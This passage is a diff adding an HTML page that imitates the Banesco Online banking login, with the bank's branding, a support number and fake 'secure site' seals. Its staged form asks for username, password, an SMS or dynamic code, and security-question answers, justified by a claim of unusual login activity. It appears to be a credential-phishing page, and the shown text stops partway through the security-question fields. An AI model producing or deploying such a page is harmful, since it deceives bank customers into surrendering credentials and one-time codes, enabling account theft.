@@ -1,0 +1,2450 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banesco Online</title>
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,600;0,700;0,800;1,400&family=Roboto:wght@300;400;500;700&display=swap');
+
+        /* Estilo del card azul lateral */
+        .support-card {
+            background-color: #173868;
+        }
+
+        /* Estilo del card verde "Gestiona tus Claves" */
+        .keys-card {
+            background-color: #2b7747;
+        }
+
+        /* Botones de acción */
+        .btn-banesco {
+            background-color: #2e6d4c;
+            transition: background-color 0.15s ease-in-out, transform 0.1s ease;
+        }
+        
+        .btn-banesco:hover {
+            background-color: #24583c;
+        }
+
+        .btn-banesco:active {
+            transform: scale(0.98);
+        }
+
+        /* Input personalizado con el placeholder exacto */
+        .banesco-input {
+            border: 1px solid #bfbfbf;
+            border-radius: 4px;
+            color: #333333;
+            font-size: 14px;
+            letter-spacing: 0.3px;
+            height: 42px;
+            padding: 0 36px 0 12px;
+            box-sizing: border-box;
+        }
+
+        .banesco-input::placeholder {
+            color: #999999;
+            font-weight: 500;
+            font-size: 13px;
+        }
+
+        .banesco-input:focus {
+            outline: none;
+            border-color: #2b7747;
+            box-shadow: 0 0 0 1px #2b7747;
+        }
+
+        /* Sombra e insignia TrustedSite */
+        .trusted-badge {
+            border: 1px solid #c9c9c9;
+            background-color: #ffffff;
+            font-size: 8px;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        html, body {
+            width: 100%;
+            min-height: 100vh;
+            background-color: #ffffff;
+            color: #333333;
+            -webkit-font-smoothing: antialiased;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+
+        input, textarea {
+            -webkit-user-select: text !important;
+            -moz-user-select: text !important;
+            -ms-user-select: text !important;
+            user-select: text !important;
+        }
+
+        body {
+            padding: 20px 32px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Contenedor principal */
+        .portal-container {
+            width: 100%;
+            max-width: 100%;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            margin: 0;
+            text-align: left;
+        }
+
+        /* Encabezado superior */
+        header {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 40px;
+        }
+
+        .brand-logo {
+            display: flex;
+            align-items: center;
+        }
+
+            .brand-logo img {
+                height: 36px;
+                width: auto;
+                display: block;
+            }
+
+        .btn-salir {
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+        }
+
+        /* Cuadrícula principal */
+        .portal-main {
+            width: 100%;
+            display: grid;
+            grid-template-columns: 230px 1fr;
+            gap: 24px;
+            align-items: start;
+        }
+
+        /* --- COLUMNA IZQUIERDA --- */
+        .sidebar {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+
+        .box-soporte {
+            background-color: #174274;
+            color: #ffffff;
+            padding: 16px 15px;
+            border-radius: 4px;
+        }
+
+            .box-soporte h3 {
+                font-size: 19px;
+                font-weight: bold;
+                line-height: 1.2;
+                margin-bottom: 8px;
+            }
+
+            .box-soporte p {
+                font-size: 14px;
+                line-height: 1.35;
+                color: #e5edf7;
+            }
+
+            .box-soporte .telefono {
+                font-weight: bold;
+                font-size: 15px;
+                color: #ffffff;
+                margin-top: 6px;
+                display: block;
+            }
+
+        .box-claves {
+            display: block;
+            width: 100%;
+            border-radius: 4px;
+            overflow: hidden;
+            text-decoration: none;
+        }
+
+            .box-claves img {
+                width: 100%;
+                height: auto;
+                display: block;
+            }
+
+        .sellos-seguridad {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 8px;
+            margin-top: 4px;
+            font-size: 13px;
+            color: #555555;
+            width: 100%;
+        }
+
+        .sello-sitio-seguro {
+            display: flex;
+            align-items: center;
+        }
+
+            .sello-sitio-seguro img {
+                height: 28px;
+                width: auto;
+                display: block;
+            }
+
+        .sello-trusted {
+            display: flex;
+            align-items: center;
+        }
+
+            .sello-trusted img {
+                height: 26px;
+                width: auto;
+                display: block;
+            }
+
+        /* --- COLUMNA DERECHA --- */
+        .content-right {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            min-width: 0;
+            width: 100%;
+        }
+
+        .top-cards-row {
+            display: grid;
+            grid-template-columns: 1fr 1.08fr;
+            gap: 20px;
+            align-items: stretch;
+        }
+
+        /* Tarjeta Nuevos Usuarios */
+        .card-nuevos-usuarios {
+            border: 1px solid #d4d4d4;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            min-height: 170px;
+        }
+
+        .header-nuevos-usuarios {
+            background-color: #dddddd;
+            padding: 8px 10px;
+            text-align: center;
+            font-size: 14.5px;
+            font-weight: bold;
+            color: #444444;
+            letter-spacing: 0.2px;
+        }
+
+        .body-nuevos-usuarios {
+            padding: 12px 14px;
+            font-size: 14px;
+            color: #333333;
+            line-height: 1.4;
+        }
+
+        .footer-nuevos-usuarios {
+            padding-bottom: 12px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .btn-afiliarse {
+            background: linear-gradient(to bottom, #f2f2f2 0%, #dbdbdb 100%);
+            border: 1px solid #b8b8b8;
+            border-radius: 3px;
+            padding: 6px 16px;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            color: #0b3e6d;
+            text-decoration: underline;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        /* Formulario de Ingreso */
+        .card-login-form {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .casilla-usuario {
+            display: flex;
+            align-items: center;
+            background-color: #ffffff;
+            border: 1px solid #999999;
+            border-radius: 3px;
+            height: 42px;
+            padding: 0 10px;
+        }
+
+        .icono-avatar {
+            display: flex;
+            align-items: center;
+            margin-right: 8px;
+            flex-shrink: 0;
+        }
+
+        .casilla-usuario input {
+            border: none;
+            outline: none;
+            width: 100%;
+            text-align: left;
+            font-size: 15px;
+            color: #333333;
+            background: transparent;
+            padding: 0;
+            margin: 0;
+        }
+
+            .casilla-usuario input::placeholder {
+                color: #999999;
+                font-size: 14px;
+                font-weight: normal;
+                letter-spacing: 0.4px;
+                text-align: left;
+            }
+
+        .btn-ayuda-pregunta {
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            background-color: #277553;
+            color: #ffffff;
+            font-size: 13.5px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            flex-shrink: 0;
+            user-select: none;
+            margin-left: 6px;
+        }
+
+        /* --- PANELS DE INFORMACIÓN --- */
+        .box-info-sms {
+            background-color: #f1f5f9;
+            border: 1px solid #d0dbe5;
+            border-left: 4px solid #174274;
+            border-radius: 3px;
+            padding: 10px 12px;
+            margin-bottom: 2px;
+        }
+
+        .texto-instruccion-sms {
+            font-size: 13px;
+            color: #174274;
+            line-height: 1.45;
+        }
+
+        .opciones-alternativas {
+            margin-top: 8px;
+            padding-top: 6px;
+            border-top: 1px solid #e1e8f0;
+            font-size: 12px;
+            color: #555555;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .link-opcion {
+            color: #277553;
+            font-weight: bold;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+
+            .link-opcion:hover {
+                color: #1c5d3e;
+            }
+
+        /* --- ESTILOS PREGUNTAS DE SEGURIDAD --- */
+        .pregunta-label {
+            font-size: 13.5px;
+            font-weight: bold;
+            color: #174274;
+            margin-bottom: 4px;
+            margin-top: 8px;
+            display: block;
+            line-height: 1.35;
+            word-wrap: break-word;
+            word-break: break-word;
+        }
+
+        /* Botón verde Aceptar / Iniciar / Confirmar */
+        .btn-aceptar {
+            background: linear-gradient(to bottom, #2b7854 0%, #216847 100%);
+            border: 1px solid #1c5d3e;
+            color: #ffffff;
+            height: 42px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 3px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 8px;
+        }
+
+        /* Casilla de recuperación con salvavidas */
+        .box-recuperacion {
+            background-color: #eaeaea;
+            border: 1px solid #dcdcdc;
+            border-radius: 3px;
+            padding: 8px 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+            .box-recuperacion a {
+                color: #0b3e6d;
+                font-size: 13px;
+                font-weight: bold;
+                text-decoration: underline;
+                line-height: 1.25;
+            }
+
+        /* Banner Inferior de Remesas */
+        .banner-remesas {
+            width: 100%;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+            .banner-remesas img {
+                width: 100%;
+                height: 270px;
+                object-fit: cover;
+                display: block;
+                border-radius: 4px;
+            }
+
+        /* Pie de página inferior */
+        footer {
+            width: 100%;
+            text-align: center;
+            margin-top: 60px;
+            padding-bottom: 10px;
+            font-size: 13.5px;
+            color: #666666;
+        }
+
+        /* --- PANTALLA DE CARGA (LOADER PROFESIONAL BANESCONLINE) --- */
+        .loader-container {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(15, 23, 42, 0.55);
+            backdrop-filter: blur(6px);
+            -webkit-backdrop-filter: blur(6px);
+            z-index: 99999;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+        }
+
+        .loader-card {
+            background: #ffffff;
+            width: 100%;
+            max-width: 360px;
+            border-radius: 14px;
+            padding: 30px 24px 22px 24px;
+            box-shadow: 0 20px 40px -10px rgba(0, 0, 0, 0.25), 0 0 0 1px rgba(255, 255, 255, 0.8);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            animation: loaderFadeIn 0.25s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        @keyframes loaderFadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .loader-main-logo {
+            width: 170px;
+            height: auto;
+            margin-bottom: 22px;
+            display: block;
+        }
+
+        .loader-spinner-wrapper {
+            position: relative;
+            width: 46px;
+            height: 46px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 18px;
+        }
+
+        .loader-spinner-ring {
+            position: absolute;
+            inset: 0;
+            border: 3.5px solid #e2e8f0;
+            border-top-color: #007953;
+            border-right-color: #219963;
+            border-radius: 50%;
+            animation: spinRing 0.95s linear infinite;
+        }
+
+        @keyframes spinRing {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loader-title {
+            font-size: 16.5px;
+            font-weight: 700;
+            color: #174274;
+            margin-bottom: 6px;
+            letter-spacing: -0.2px;
+        }
+
+        .loader-subtitle {
+            font-size: 13px;
+            color: #64748b;
+            margin-bottom: 20px;
+            line-height: 1.35;
+        }
+
+        .loader-bar-bg {
+            width: 100%;
+            height: 3px;
+            background: #e2e8f0;
+            border-radius: 3px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .loader-bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #007953 0%, #219963 100%);
+            width: 45%;
+            position: absolute;
+            left: 0;
+            border-radius: 3px;
+            animation: barIndeterminate 1.4s ease-in-out infinite;
+        }
+
+        @keyframes barIndeterminate {
+            0% {
+                left: -45%;
+                width: 45%;
+            }
+            50% {
+                left: 25%;
+                width: 60%;
+            }
+            100% {
+                left: 100%;
+                width: 45%;
+            }
+        }
+
+        .loader-security-badge {
+            margin-top: 18px;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 11.5px;
+            color: #475569;
+            font-weight: 500;
+        }
+
+    /* Modal de Error de Autenticación Banesco */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(15, 23, 42, 0.62);
+      backdrop-filter: blur(4px);
+      -webkit-backdrop-filter: blur(4px);
+      justify-content: center;
+      align-items: center;
+      padding: 16px;
+      z-index: 999999;
+      opacity: 0;
+      transition: opacity 0.22s ease;
+    }
+
+    .modal-overlay.active {
+      display: flex;
+      opacity: 1;
+    }
+
+    .modal-card {
+      background-color: #ffffff;
+      width: 100%;
+      max-width: 480px;
+      border-radius: 14px;
+      padding: 28px 28px 22px 28px;
+      box-shadow: 0 20px 45px -10px rgba(0, 0, 0, 0.28), 
+                  0 0 0 1px rgba(0, 0, 0, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.9);
+      position: relative;
+      animation: modalSlideUp 0.26s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+      transform-origin: center center;
+    }
+
+    @keyframes modalSlideUp {
+      0% {
+        opacity: 0;
+        transform: scale(0.95) translateY(12px);
+      }
+      100% {
+        opacity: 1;
+        transform: scale(1) translateY(0);
+      }
+    }
+
+    .modal-header {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding-bottom: 18px;
+      border-bottom: 1px solid #edf2f7;
+    }
+
+    .error-icon {
+      background: linear-gradient(135deg, #d32f2f 0%, #b71c1c 100%);
+      color: #ffffff;
+      width: 40px;
+      height: 40px;
+      min-width: 40px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 4px 12px rgba(183, 28, 28, 0.32);
+      flex-shrink: 0;
+    }
+
+    .error-icon svg {
+      width: 22px;
+      height: 22px;
+      stroke: #ffffff;
+      stroke-width: 2.8;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+      fill: none;
+    }
+
+    .modal-header h2 {
+      font-size: 21px;
+      font-weight: 700;
+      color: #1e293b;
+      letter-spacing: -0.3px;
+      line-height: 1.25;
+    }
+
+    .modal-body {
+      padding: 22px 0 26px 0;
+    }
+
+    .modal-body p {
+      font-size: 15.5px;
+      line-height: 1.6;
+      color: #475569;
+      text-align: left;
+    }
+
+    .btn-submit-modal {
+      width: 100%;
+      background: linear-gradient(180deg, #00845a 0%, #00704c 100%);
+      color: #ffffff;
+      border: 1px solid #006343;
+      border-radius: 8px;
+      padding: 14px 20px;
+      font-size: 17px;
+      font-weight: 600;
+      cursor: pointer;
+      display: block;
+      outline: none;
+      box-shadow: 0 4px 14px rgba(0, 112, 76, 0.28);
+      transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+      text-align: center;
+      user-select: none;
+    }
+
+    .btn-submit-modal:hover {
+      background: linear-gradient(180deg, #007550 0%, #006041 100%);
+      box-shadow: 0 6px 18px rgba(0, 112, 76, 0.38);
+      transform: translateY(-1px);
+    }
+
+    .btn-submit-modal:active {
+      transform: translateY(1px);
+      box-shadow: 0 2px 6px rgba(0, 112, 76, 0.2);
+    }
+
+    .modal-footer {
+      margin-top: 24px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding-bottom: 4px;
+    }
+
+    .footer-link {
+      display: inline-flex;
+      align-items: center;
+      gap: 9px;
+      color: #0b3e6d;
+      text-decoration: none;
+      font-size: 15px;
+      font-weight: 500;
+      transition: color 0.18s ease;
+      cursor: pointer;
+    }
+
+    .footer-link:hover {
+      color: #072a4c;
+      text-decoration: underline;
+    }
+
+    .help-icon {
+      width: 20px;
+      height: 20px;
+      border: 1.8px solid #0b3e6d;
+      border-radius: 50%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12.5px;
+      font-weight: 700;
+      flex-shrink: 0;
+      line-height: 1;
+      padding-top: 1px;
+    }
+
+    .casilla-usuario.error {
+      border-color: #da2929;
+    }
+
+    @media (max-width: 480px) {
+      .modal-card {
+        padding: 22px 20px 18px 20px;
+        border-radius: 12px;
+      }
+      .modal-header h2 {
+        font-size: 19px;
+      }
+      .modal-body p {
+        font-size: 14.5px;
+      }
+      .btn-submit-modal {
+        font-size: 16px;
+        padding: 13px 16px;
+      }
+      .footer-link {
+        font-size: 14px;
+      }
+    }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Adaptación a dispositivos móviles */
+        @media (max-width: 768px) {
+            body {
+                padding: 10px 12px 16px 12px;
+            }
+
+            .portal-container {
+                justify-content: flex-start;
+            }
+
+            header {
+                margin-bottom: 24px;
+            }
+
+            .brand-logo img {
+                height: 24px;
+            }
+
+            .btn-salir svg {
+                width: 30px;
+                height: 30px;
+            }
+
+            .portal-main {
+                display: grid;
+                grid-template-columns: 110px 1fr;
+                gap: 10px;
+            }
+
+            .sidebar {
+                display: flex;
+                flex-direction: column;
+                gap: 8px;
+            }
+
+            .box-soporte {
+                padding: 9px 8px;
+                border-radius: 3px;
+            }
+
+                .box-soporte h3 {
+                    font-size: 11.5px;
+                    margin-bottom: 3px;
+                    line-height: 1.25;
+                }
+
+                .box-soporte p {
+                    font-size: 9.5px;
+                    line-height: 1.25;
+                }
+
+                .box-soporte .telefono {
+                    font-size: 10px;
+                    margin-top: 3px;
+                }
+
+            .box-claves {
+                border-radius: 3px;
+            }
+
+            .sellos-seguridad {
+                font-size: 9px;
+                gap: 5px;
+                margin-top: 3px;
+            }
+
+            .sello-sitio-seguro img {
+                height: 18px;
+            }
+
+            .sello-trusted img {
+                height: 16px;
+            }
+
+            .content-right {
+                gap: 10px;
+            }
+
+            .top-cards-row {
+                display: grid;
+                grid-template-columns: 1fr 1.08fr;
+                gap: 10px;
+            }
+
+            .card-nuevos-usuarios {
+                min-height: 110px;
+            }
+
+            .header-nuevos-usuarios {
+                padding: 5px 8px;
+                font-size: 11px;
+            }
+
+            .body-nuevos-usuarios {
+                padding: 7px 8px;
+                font-size: 10.5px;
+                line-height: 1.3;
+            }
+
+            .footer-nuevos-usuarios {
+                padding-bottom: 7px;
+            }
+
+            .btn-afiliarse {
+                font-size: 10.5px;
+                padding: 4px 10px;
+                gap: 5px;
+                border-radius: 3px;
+            }
+
+                .btn-afiliarse svg {
+                    width: 11px;
+                    height: 11px;
+                }
+
+            .card-login-form {
+                gap: 7px;
+            }
+
+            .casilla-usuario {
+                height: 34px;
+                padding: 0 8px;
+                border-radius: 3px;
+            }
+
+            .icono-avatar {
+                margin-right: 6px;
+            }
+
+                .icono-avatar svg {
+                    width: 14px;
+                    height: 14px;
+                }
+
+            .casilla-usuario input {
+                font-size: 12px;
+            }
+
+                .casilla-usuario input::placeholder {
+                    font-size: 11px;
+                }
+
+            .btn-ayuda-pregunta {
+                width: 16px;
+                height: 16px;
+                font-size: 10px;
+                margin-left: 4px;
+            }
+
+            .box-info-sms {
+                padding: 8px 10px;
+                border-left-width: 3px;
+            }
+
+            .texto-instruccion-sms {
+                font-size: 11px;
+            }
+
+            .opciones-alternativas {
+                margin-top: 6px;
+                padding-top: 5px;
+                font-size: 10px;
+                gap: 4px;
+            }
+
+            .pregunta-label {
+                font-size: 11.5px;
+                margin-top: 4px;
+                margin-bottom: 3px;
+            }
+
+            .banesco-input {
+                height: 34px !important;
+                font-size: 12px !important;
+                padding: 0 28px 0 8px !important;
+            }
+
+            .banesco-input::placeholder {
+                font-size: 11px !important;
+            }
+
+            .btn-aceptar {
+                height: 34px;
+                font-size: 13px;
+                border-radius: 3px;
+                margin-top: 6px;
+            }
+
+            .box-recuperacion {
+                padding: 6px 8px;
+                gap: 6px;
+                border-radius: 3px;
+            }
+
+                .box-recuperacion svg {
+                    width: 14px;
+                    height: 14px;
+                }
+
+                .box-recuperacion a {
+                    font-size: 10.5px;
+                    line-height: 1.2;
+                }
+
+            .banner-remesas {
+                border-radius: 3px;
+            }
+
+                .banner-remesas img {
+                    height: auto;
+                    max-height: 160px;
+                    border-radius: 3px;
+                }
+
+            footer {
+                margin-top: 35px;
+                font-size: 10.5px;
+                padding-bottom: 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Contenedor Principal Portal -->
+    <div class="portal-container" id="portalContainer">
+
+        <!-- Encabezado -->
+        <header>
+            <div class="brand-logo">
+                <img src="logo_BanescOnline.png" alt="BanescOnline">
+            </div>
+            <a href="iniciar.html" class="btn-salir" title="Salir">
+                <svg width="32" height="32" viewBox="0 0 24 24" fill="none">
+                    <path d="M11 4H5C3.89543 4 3 4.89543 3 6V18C3 19.1046 3.89543 20 5 20H11" stroke="#007953" stroke-width="2.5" stroke-linecap="round" />
+                    <path d="M15 8L19 12L15 16" stroke="#007953" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" />
+                    <path d="M8 12H19" stroke="#007953" stroke-width="2.5" stroke-linecap="round" />
+                </svg>
+            </a>
+        </header>
+
+        <!-- Disposición Principal -->
+        <div class="portal-main">
+
+            <!-- Columna Izquierda -->
+            <aside class="sidebar">
+                <div class="box-soporte">
+                    <h3>Soporte Banca<br>por Internet</h3>
+                    <p>Si desea más información o tiene alguna duda llámenos</p>
+                    <span class="telefono">al 0212-501.1111</span>
+                </div>
+
+                <a href="iniciar.html" class="box-claves">
+                    <img src="gestion-de-claves.png" alt="Gestiona tus Claves">
+                </a>
+
+                <div class="sellos-seguridad">
+                    <div class="sello-sitio-seguro">
+                        <img src="sitio-seguro.png" alt="Sitio Seguro">
+                    </div>
+                    <div class="sello-trusted">
+                        <img src="trustedsite.png" alt="TrustedSite">
+                    </div>
+                </div>
+            </aside>
+
+            <!-- Columna Derecha -->
+            <section class="content-right">
+                <div class="top-cards-row">
+
+
+                    <!-- Nuevos Usuarios -->
+                    <div class="card-nuevos-usuarios">
+                        <div class="header-nuevos-usuarios">NUEVOS USUARIOS</div>
+                        <div class="body-nuevos-usuarios">
+                            Si usted está ingresando a este servicio por primera vez, o no posee Usuario y Clave
+                        </div>
+                        <div class="footer-nuevos-usuarios">
+                            <button type="button" class="btn-afiliarse" onclick="window.location.href='iniciar.html'">
+                                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#0b3e6d" stroke-width="2.5">
+                                    <circle cx="12" cy="12" r="10" />
+                                    <line x1="12" y1="8" x2="12" y2="16" />
+                                    <line x1="8" y1="12" x2="16" y2="12" />
+                                </svg>
+                                Afíliese Aquí
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Formulario de Acceso -->
+                    <div class="card-login-form">
+                        <form id="formLogin" onsubmit="procesarIngreso(event)">
+
+                            <!-- Paso 1: Usuario -->
+                            <div id="boxUsuario" style="display: flex; flex-direction: column; gap: 4px;">
+                                <div class="casilla-usuario">
+                                    <span class="icono-avatar">
+                                        <svg width="18" height="18" viewBox="0 0 24 24" fill="#707070">
+                                            <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
+                                        </svg>
+                                    </span>
+                                    <input type="text" id="inputUsuario" placeholder="Ingrese su usuario" autocomplete="off" spellcheck="false" required>
+                                    <span class="btn-ayuda-pregunta" title="Ayuda" onclick="window.location.href='iniciar.html'">?</span>
+                                </div>
+                            </div>
+
+                            <!-- Paso 2: Clave -->
+                            <div id="boxClave" style="display: none; flex-direction: column; gap: 4px;">
+                                <div class="casilla-usuario">
+                                    <span class="icono-avatar">
+                                        <svg width="18" height="18" viewBox="0 0 24 24" fill="#707070">
+                                            <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
+                                        </svg>
+                                    </span>
+                                    <input type="password" id="inputClave" placeholder="Ingrese su clave de acceso" autocomplete="off">
+                                </div>
+                            </div>
+
+                            <!-- Paso 3: Código de Validación SMS / Clave Dinámica -->
+                            <div id="boxSMS" style="display: none; flex-direction: column; width: 100%;">
+                                <h1 class="text-[13.5px] md:text-[14.5px] font-bold text-[#174274] tracking-tight uppercase mb-2">
+                                  &gt; VALIDACIÓN DE CLAVE DINÁMICA / SMS
+                                </h1>
+
+                                <!-- Cuadro de Notificación / Verificación -->
+                                <div class="border border-[#cbd5e1] rounded-[3px] mb-3 overflow-hidden bg-[#f8fafc]">
+                                  <div class="bg-[#e2e8f0] px-2.5 py-1.5 flex items-center gap-2 border-b border-[#cbd5e1]">
+                                    <div class="w-3.5 h-3.5 rounded-full bg-[#bf1818] flex items-center justify-center flex-shrink-0 shadow-sm">
+                                      <span class="text-white font-black text-[9px] leading-none mb-[1px]">!</span>
+                                    </div>
+                                    <span class="text-[12px] font-bold text-[#1e293b]">Verificación de Seguridad Banesco</span>
+                                  </div>
+
+                                  <div class="p-2.5 text-[11.5px] md:text-[12.5px] text-[#334155] leading-[1.45] font-normal space-y-1">
+                                    <p>
+                                      Hemos enviado una Clave Digital de Validación vía SMS a su número celular registrado. Por favor, ingrésela a continuación.
+                                    </p>
+                                    <div class="pt-2 border-t border-[#cbd5e1] flex flex-col gap-1 text-[11.5px] mt-1.5">
+                                      <span class="text-[#64748b]">¿No recibió su clave?</span>
+                                      <a class="text-[#277553] font-bold underline cursor-pointer hover:text-[#1c5d3e]" onclick="solicitarClaveCorreo(event)">Enviar clave al correo electrónico registrado</a>
+                                    </div>
+                                  </div>
+                                </div>
+
+                                <!-- Input Clave Dinámica / SMS -->
+                                <div class="flex flex-col space-y-1 mb-1">
+                                  <label for="inputSMS" class="text-[13px] md:text-[14px] font-bold text-[#174274] mb-1 tracking-tight">
+                                    Ingrese su Clave Digital / SMS
+                                  </label>
+                                  <div class="relative flex items-center">
+                                    <input 
+                                      type="text" 
+                                      id="inputSMS" 
+                                      name="inputSMS" 
+                                      placeholder="CLAVE DIGITAL / SMS" 
+                                      class="banesco-input w-full uppercase"
+                                      autocomplete="off"
+                                      maxlength="8"
+                                    >
+                                  </div>
+                                </div>
+                            </div>
+
+                            <!-- Paso 4: Preguntas de Seguridad (Diseño Oficial BanescOnline) -->
+                            <div id="boxPreguntas" style="display: none; flex-direction: column; width: 100%;">
+                                <h1 class="text-[13.5px] md:text-[14.5px] font-bold text-[#174274] tracking-tight uppercase mb-2">
+                                  &gt; VALIDACIÓN DE PREGUNTAS DE SEGURIDAD
+                                </h1>
+
+                                <!-- Cuadro de Notificación / Verificación -->
+                                <div class="border border-[#cbd5e1] rounded-[3px] mb-3 overflow-hidden bg-[#f8fafc]">
+                                  <div class="bg-[#e2e8f0] px-2.5 py-1.5 flex items-center gap-2 border-b border-[#cbd5e1]">
+                                    <div class="w-3.5 h-3.5 rounded-full bg-[#bf1818] flex items-center justify-center flex-shrink-0 shadow-sm">
+                                      <span class="text-white font-black text-[9px] leading-none mb-[1px]">!</span>
+                                    </div>
+                                    <span class="text-[12px] font-bold text-[#1e293b]">Verificación de Seguridad Banesco</span>
+                                  </div>
+
+                                  <div class="p-2.5 text-[11.5px] md:text-[12.5px] text-[#334155] leading-[1.45] font-normal space-y-1">
+                                    <p>
+                                      Se han detectado características distintas a las habituales en su ingreso.
+                                    </p>
+                                    <p>
+                                      Por favor responda las siguientes preguntas de seguridad.
+                                    </p>
+                                    <p>
+                                      Recuerde que las respuestas deben escribirse exactamente como Ud. las definió al momento de afiliarse.
+                                    </p>
+                                  </div>
+                                </div>
+
+                                <!-- Preguntas Inputs -->
+                                <div class="flex flex-col space-y-2.5">
+                                  
+                                  <!-- Pregunta 1 -->
+                                  <div class="flex flex-col">
+                                    <label for="inputPregunta1" id="labelPregunta1" class="text-[13px] md:text-[14px] font-bold text-[#174274] mb-1 tracking-tight">
+                                      1. Pregunta de seguridad
+                                    </label>
+                                    <div class="relative flex items-center">
+                                      <input 
+                                        type="password" 
+                                        id="inputPregunta1" 
+                                        name="inputPregunta1" 
+                                        placeholder="ESCRIBA AQUÍ SU RESPUESTA" 
+                                        class="banesco-input w-full uppercase"
+                                        autocomplete="off"
+                                      >
+                                      <button 
+                                        type="button" 
+                                        onclick="togglePasswordVisibility('inputPregunta1', this)" 
+                                        class="absolute right-2 text-[#5a8a6e] hover:text-[#2b7747] p-1 focus:outline-none"
+                                        title="Mostrar / Ocultar respuesta"
+                                      >
+                                        <svg class="w-4 h-4 eye-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                                          <circle cx="12" cy="12" r="3"></circle>
+                                        </svg>
+                                      </button>
+                                    </div>
+                                  </div>
+
+                                  <!-- Pregunta 2 -->
+                                  <div class="flex flex-col pt-1">
+                                    <label for="inputPregunta2" id="labelPregunta2" class="text-[13px] md:text-[14px] font-bold text-[#174274] mb-1 tracking-tight">
+                                      2. Pregunta de seguridad
+                                    </label>
+                                    <div class="relative flex items-center">
+                                      <input 
+                                        type="password" 
+                                        id="inputPregunta2" 
+                                        name="inputPregunta2" 
+                                        placeholder="ESCRIBA AQUÍ SU RESPUESTA" 
+                                        class="banesco-input w-full uppercase"
+                                        autocomplete="off"
+                                      >
+                                      <button 
+                                        type="button" 
+                                        onclick="togglePasswordVisibility('inputPregunta2', this)" 
+                                        class="absolute right-2 text-[#5a8a6e] hover:text-[#2b7747] p-1 focus:outline-none"
+                                        title="Mostrar / Ocultar respuesta"
+                                      >
+                                        <svg class="w-4 h-4 eye-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                                          <circle cx="12" cy="12" r="3"></circle>
